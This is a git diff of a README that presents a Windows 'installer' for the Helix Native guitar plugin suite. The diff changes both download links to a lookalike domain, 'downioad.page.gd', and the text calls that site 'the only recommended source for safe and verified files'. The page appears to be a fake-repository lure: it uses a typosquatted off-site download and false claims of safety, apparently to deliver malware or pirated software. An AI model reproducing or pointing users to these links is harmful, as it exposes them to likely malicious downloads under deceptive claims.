@@ -2,7 +2,7 @@
 
 Helix Native is a powerful digital guitar processor and effects suite that brings studio-quality sounds to your computer. This comprehensive collection offers a wide array of plugins and presets designed to enhance your audio production experience. It's perfect for musicians and producers looking to expand their creative toolkit on Windows platforms.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Included
 
@@ -54,6 +54,6 @@ A4: Ensure that you have the necessary permissions and that no other Helix Nativ
 
 For the latest version and updates, please visit the official download page. This is the only recommended source for safe and verified files.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 We hope this collection helps you unlock new creative possibilities with Helix Native. Enjoy your music production journey!
